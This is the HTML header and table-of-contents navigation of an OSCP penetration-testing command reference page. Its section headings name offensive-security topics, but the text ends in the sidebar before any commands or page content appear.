
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="PakCyberbot's OSCP Notes and Environment">
      
      
      
        <link rel="canonical" href="https://pakcyberbot.com/OSCP-Notes-and-Environment/10_Commands_Quick_Reference/">
      
      
        <link rel="prev" href="..">
      
      
        <link rel="next" href="../11_Code_And_Exploits/">
      
      
      <link rel="icon" href="../assets/favicon.ico">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.15">
    
    
      
        <title>⌨️ OSCP Commands - Quick Reference - OSCP Quick Reference</title>
      
    
    
      <link rel="stylesheet" href="../assets/stylesheets/main.342714a4.min.css">
      
        
        <link rel="stylesheet" href="../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#oscp-commands-quick-reference" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href=".." title="OSCP Quick Reference" class="md-header__button md-logo" aria-label="OSCP Quick Reference" data-md-component="logo">
      
  <img src="../assets/logo.png" alt="logo">

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            OSCP Quick Reference
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              ⌨️ OSCP Commands - Quick Reference
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m14.3 16-.7-2h-3.2l-.7 2H7.8L11 7h2l3.2 9zM20 8.69V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12zm-9.15 3.96h2.3L12 9z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="blue-grey" data-md-color-accent="green"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="green"  aria-label="Switch to system preferences"  type="radio" name="__palette" id="__palette_2">
    
      <label class="md-header__button md-icon" title="Switch to system preferences" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      
      
        <label class="md-header__button md-icon" for="__search">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        </label>
        <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
            
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
          </a>
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
        <div class="md-search__suggest" data-md-component="search-suggest"></div>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
      
    
    
      <div class="md-header__source">
        <a href="https://github.com/pakcyberbot/OSCP-Notes-and-Environment" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 480 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1M480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2m-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3m-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1"/></svg>
  </div>
  <div class="md-source__repository">
    GitHub
  </div>
</a>
      </div>
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href=".." title="OSCP Quick Reference" class="md-nav__button md-logo" aria-label="OSCP Quick Reference" data-md-component="logo">
      
  <img src="../assets/logo.png" alt="logo">

    </a>
    OSCP Quick Reference
  </label>
  
    <div class="md-nav__source">
      <a href="https://github.com/pakcyberbot/OSCP-Notes-and-Environment" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 480 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1M480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2m-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3m-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1"/></svg>
  </div>
  <div class="md-source__repository">
    GitHub
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href=".." class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Home
    
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  
  <span class="md-ellipsis">
    ⌨️ OSCP Commands - Quick Reference
    
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  
  <span class="md-ellipsis">
    ⌨️ OSCP Commands - Quick Reference
    
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#tool-docs" class="md-nav__link">
    <span class="md-ellipsis">
      Tool Docs
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#attacker-machine-commands" class="md-nav__link">
    <span class="md-ellipsis">
      Attacker Machine Commands
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Attacker Machine Commands">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#general-linux-commands" class="md-nav__link">
    <span class="md-ellipsis">
      General Linux Commands
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#general-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      General Enumeration
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#service-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      Service Enumeration
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Service Enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#dns" class="md-nav__link">
    <span class="md-ellipsis">
      DNS
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#https" class="md-nav__link">
    <span class="md-ellipsis">
      HTTP(S)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smb" class="md-nav__link">
    <span class="md-ellipsis">
      SMB
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#snmp" class="md-nav__link">
    <span class="md-ellipsis">
      SNMP
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smtppop3imap" class="md-nav__link">
    <span class="md-ellipsis">
      SMTP/POP3/IMAP
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ftp" class="md-nav__link">
    <span class="md-ellipsis">
      FTP
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#rpc" class="md-nav__link">
    <span class="md-ellipsis">
      RPC
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ldap" class="md-nav__link">
    <span class="md-ellipsis">
      LDAP
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#oracle-database-1521" class="md-nav__link">
    <span class="md-ellipsis">
      Oracle Database (1521)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#unknown-ports" class="md-nav__link">
    <span class="md-ellipsis">
      Unknown ports
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sql-services" class="md-nav__link">
    <span class="md-ellipsis">
      SQL Services
    </span>
  </a>
  
    <nav class="md-nav" aria-label="SQL Services">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#sql-commands" class="md-nav__link">
    <span class="md-ellipsis">
      Sql Commands
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bruteforcing" class="md-nav__link">
    <span class="md-ellipsis">
      🔢Bruteforcing
    </span>
  </a>
  
    <nav class="md-nav" aria-label="🔢Bruteforcing">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#wordlist" class="md-nav__link">
    <span class="md-ellipsis">
      Wordlist
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Wordlist">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#some-important-mutation-rules" class="md-nav__link">
    <span class="md-ellipsis">
      Some Important Mutation rules
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#some-important-wordlists" class="md-nav__link">
    <span class="md-ellipsis">
      Some important wordlists
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#exploitation" class="md-nav__link">
    <span class="md-ellipsis">
      💥Exploitation
    </span>
  </a>
  
    <nav class="md-nav" aria-label="💥Exploitation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#payload-creation" class="md-nav__link">
    <span class="md-ellipsis">
      Payload Creation
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#evasion" class="md-nav__link">
    <span class="md-ellipsis">
      Evasion
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#file-transfer-delivery" class="md-nav__link">
    <span class="md-ellipsis">
      🚚File Transfer (Delivery)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#initial-access" class="md-nav__link">
    <span class="md-ellipsis">
      🚪Initial Access
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#extras" class="md-nav__link">
    <span class="md-ellipsis">
      Extras
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#attacker-from-windows" class="md-nav__link">
    <span class="md-ellipsis">
      Attacker From Windows
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#web-attack" class="md-nav__link">
    <span class="md-ellipsis">
      🕸 Web Attack
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#client-side-attack" class="md-nav__link">
    <span class="md-ellipsis">
      🧑 Client Side Attack
    </span>
  </a>
  
    <nav class="md-nav" aria-label="🧑 Client Side Attack">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#microsoft-windows-library-file" class="md-nav__link">
    <span class="md-ellipsis">
      Microsoft Windows Library File
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#victim-linux-commands" class="md-nav__link">
    <span class="md-ellipsis">
      🐧 Victim Linux Commands
    </span>
  </a>
  
    <nav class="md-nav" aria-label="🐧 Victim Linux Commands">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#for-more" class="md-nav__link">
    <span class="md-ellipsis">
      For more
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#stabilizing-shell" class="md-nav__link">
    <span class="md-ellipsis">
      Stabilizing shell
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      🔍Enumeration
    </span>
  </a>
  
    <nav class="md-nav" aria-label="🔍Enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#user-operating-system" class="md-nav__link">
    <span class="md-ellipsis">
      User &amp; Operating System
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#network" class="md-nav__link">
    <span class="md-ellipsis">
      Network
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cronjobs" class="md-nav__link">
    <span class="md-ellipsis">
      Cronjobs
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#misconfigured-permissions" class="md-nav__link">
    <span class="md-ellipsis">
      Misconfigured Permissions
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#drives-devices-and-packages" class="md-nav__link">
    <span class="md-ellipsis">
      Drives, devices and packages
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#processes-services" class="md-nav__link">
    <span class="md-ellipsis">
      Processes &amp; services
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#searching-commands" class="md-nav__link">
    <span class="md-ellipsis">
      Searching Commands
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#imp-files" class="md-nav__link">
    <span class="md-ellipsis">
      🗄 Imp Files
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#file-transfer-download" class="md-nav__link">
    <span class="md-ellipsis">
      📂File Transfer (Download)
    </span>
  </a>
  
    <nav class="md-nav" aria-label="📂File Transfer (Download)">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#upload-exfiltration" class="md-nav__link">
    <span class="md-ellipsis">
      (Upload) - Exfiltration
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#privesc-vectors" class="md-nav__link">
    <span class="md-ellipsis">
      ⬆ PrivEsc Vectors
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#victim-windows-commands" class="md-nav__link">
    <span class="md-ellipsis">
      🪟 Victim Windows Commands
    </span>
  </a>
  
    <nav class="md-nav" aria-label="🪟 Victim Windows Commands">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#enumeration_1" class="md-nav__link">
    <span class="md-ellipsis">
      🔍Enumeration
    </span>
  </a>
  
    <nav class="md-nav" aria-label="🔍Enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#user-system-info" class="md-nav__link">
    <span class="md-ellipsis">
      User &amp; System info
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#networking" class="md-nav__link">
    <span class="md-ellipsis">
      Networking
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#installed-apps" class="md-nav__link">
    <span class="md-ellipsis">
      Installed apps
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powershell-files" class="md-nav__link">
    <span class="md-ellipsis">
      Powershell Files
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#running-processes" class="md-nav__link">
    <span class="md-ellipsis">
      Running Processes
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#windows-services" class="md-nav__link">
    <span class="md-ellipsis">
      Windows Services
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#scheduled-tasks" class="md-nav__link">
    <span class="md-ellipsis">
      Scheduled Tasks
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#more" class="md-nav__link">
    <span class="md-ellipsis">
      More
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#searching-commands_1" class="md-nav__link">
    <span class="md-ellipsis">
      Searching Commands
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#imp-files_1" class="md-nav__link">
    <span class="md-ellipsis">
      🗄 Imp Files
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#mimikatz" class="md-nav__link">
    <span class="md-ellipsis">
      Mimikatz
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Mimikatz">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#av-enabled-machine" class="md-nav__link">
    <span class="md-ellipsis">
      AV enabled machine
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#file-transfer-download_1" class="md-nav__link">
    <span class="md-ellipsis">
      📂File Transfer (Download)
    </span>
  </a>
  
    <nav class="md-nav" aria-label="📂File Transfer (Download)">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#upload-exfiltration_1" class="md-nav__link">
    <span class="md-ellipsis">
      (Upload) - Exfiltration
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#privesc-vectors_1" class="md-nav__link">
    <span class="md-ellipsis">
      ⬆ PrivEsc Vectors
    </span>
  </a>
  
    <nav class="md-nav" aria-label="⬆ PrivEsc Vectors">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#access-after-creds" class="md-nav__link">
    <span class="md-ellipsis">
      Access After Creds
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#misconfiguredexcessive-privileges" class="md-nav__link">
    <span class="md-ellipsis">
      Misconfigured/Excessive Privileges
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Misconfigured/Excessive Privileges">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#seimpersonateprivilege-potato-attacks" class="md-nav__link">
    <span class="md-ellipsis">
      SeImpersonatePrivilege (Potato Attacks)
    </span>
  </a>
  
    <nav class="md-nav" aria-label="SeImpersonatePrivilege (Potato Attacks)">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#local-service-account-with-no-seimpersonate" class="md-nav__link">
    <span class="md-ellipsis">
      Local Service Account with no SeImpersonate
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sebackupprivilege" class="md-nav__link">
    <span class="md-ellipsis">
      SeBackupPrivilege
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#serestoreprivilege" class="md-nav__link">
    <span class="md-ellipsis">
      SeRestorePrivilege
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#semanagevolumeprivilege" class="md-nav__link">
    <span class="md-ellipsis">
      SeManageVolumePrivilege
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#semachineaccountprivilege" class="md-nav__link">
    <span class="md-ellipsis">
      SeMachineAccountPrivilege
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#group-privileges" class="md-nav__link">
    <span class="md-ellipsis">
      Group Privileges
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Group Privileges">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#server-operator-group" class="md-nav__link">
    <span class="md-ellipsis">
      Server operator group
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#secrets-extraction-using-dpapi" class="md-nav__link">
    <span class="md-ellipsis">
      Secrets extraction using DPAPI
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#privesc-thru-service" class="md-nav__link">
    <span class="md-ellipsis">
      PrivEsc Thru SERVICE
    </span>
  </a>
  
    <nav class="md-nav" aria-label="PrivEsc Thru SERVICE">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#to-check-service-permissions" class="md-nav__link">
    <span class="md-ellipsis">
      To check service permissions
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#always-install-elevated-msi" class="md-nav__link">
    <span class="md-ellipsis">
      Always Install Elevated - MSI
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#autorun-program-hijack-or-startup-app" class="md-nav__link">
    <span class="md-ellipsis">
      AutoRun Program Hijack Or Startup App
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bypass-uac" class="md-nav__link">
    <span class="md-ellipsis">
      Bypass UAC
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#useful-commands" class="md-nav__link">
    <span class="md-ellipsis">
      Useful commands
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pivoting-commands" class="md-nav__link">
    <span class="md-ellipsis">
      ⛓ Pivoting Commands
    </span>
  </a>
  
    <nav class="md-nav" aria-label="⛓ Pivoting Commands">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ligolo-ng" class="md-nav__link">
    <span class="md-ellipsis">
      Ligolo-ng
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#chisel" class="md-nav__link">
    <span class="md-ellipsis">
      Chisel
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#more_1" class="md-nav__link">
    <span class="md-ellipsis">
      More
    </span>
  </a>
  
</li>
        
      </ul>
